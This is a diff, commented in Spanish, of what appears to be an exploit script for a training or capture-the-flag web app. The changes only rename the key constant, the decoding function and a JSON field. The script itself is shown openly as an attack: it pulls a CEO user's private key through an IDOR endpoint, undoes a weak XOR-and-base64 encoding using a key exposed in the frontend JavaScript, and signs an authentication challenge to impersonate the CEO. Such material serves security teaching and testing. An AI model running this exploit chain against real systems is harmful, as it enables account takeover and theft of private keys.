@@ -20,8 +20,8 @@ from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature
 BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:5000"
 
 # La MISMA clave que esta a la vista en static/js/script.js (constante
-# OBFUSCATION_KEY). Es lo que hace reversible la "ofuscacion".
-OBFUSCATION_KEY = b"hb_backup_key_2026"
+# BACKUP_KEY). Es lo que hace reversible la "codificacion".
+BACKUP_KEY = b"hb_backup_key_2026"
 
 TARGET_USERNAME = "ceo"
 
@@ -30,10 +30,10 @@ def xor(data: bytes, key: bytes) -> bytes:
     return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
 
 
-def deobfuscate(obfuscated: str) -> str:
+def decode(encoded: str) -> str:
     """Revierte base64( XOR( base64(PEM), key ) ) -> PEM en claro."""
-    xored = base64.b64decode(obfuscated)
-    inner_b64 = xor(xored, OBFUSCATION_KEY)
+    xored = base64.b64decode(encoded)
+    inner_b64 = xor(xored, BACKUP_KEY)
     return base64.b64decode(inner_b64).decode("ascii")
 
 
@@ -58,10 +58,10 @@ def main():
 
     # --- Capa 2: robar la clave privada del CEO por el endpoint con IDOR ---
     keys = session.get(f"{BASE}/auth/keys/{ceo_id}").json()
-    print(f"[2] Clave privada ofuscada descargada de /auth/keys/{ceo_id}")
-    private_pem = deobfuscate(keys["private_key_obfuscated"])
+    print(f"[2] Clave privada codificada descargada de /auth/keys/{ceo_id}")
+    private_pem = decode(keys["private_key"])
     private_key = serialization.load_pem_private_key(private_pem.encode("ascii"), password=None)
-    print("    Des-ofuscada con la key del frontend -> PEM en claro.")
+    print("    Decodificada con la key del frontend -> PEM en claro.")
 
     # --- Capa 3.2: firmar el challenge como si fueramos el CEO ---
     signature = raw_signature(private_key, challenge)
